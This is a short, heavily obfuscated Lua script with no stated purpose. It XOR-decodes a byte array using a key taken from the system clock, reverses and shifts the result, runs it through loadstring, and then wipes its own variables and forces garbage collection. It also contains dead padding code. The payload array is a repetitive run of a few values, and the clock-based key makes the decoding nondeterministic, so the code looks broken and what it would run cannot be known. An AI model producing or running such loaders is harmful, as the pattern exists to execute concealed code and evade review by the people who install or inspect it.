local _c=string.char
local _x=bit32.bxor
local _t=table.concat
local _l=loadstring
local _r=math.random

local _s=((os.clock()*1000)%251)+5

--e
do
  local _n=0
  for i=1,10 do _n=_n+i*_r(1,9) end
end

--f
local _A={
  96,33,56,56,50,51,61,57,50,57,50,50,61,50,61,56,51,61,50,57,
  56,51,61,50,50,57,61,56,51,61,50,57,50,61,56,51,61,50,57,56,
  51,61,50,50,57,61,56,51,61,50,57,50,61,56,51,61,50,57,56
}

-- g
local function _d(b,k)
  local o={}
  for i=1,#b do
    o[i]=_c(_x(b[i],k))
  end
  return _t(o)
end

--h
local _L1=_d(_A,_s)

--i
local _B={}
for i=#_L1,1,-1 do
  _B[#_B+1]=_c(_L1:byte(i)-1)
end
local _SRC=_t(_B)

--j
local _F=_l(_SRC)
if _F then
  _F()
end

--k
_A=nil
_B=nil
_L1=nil
_SRC=nil
_d=nil
collectgarbage("collect")
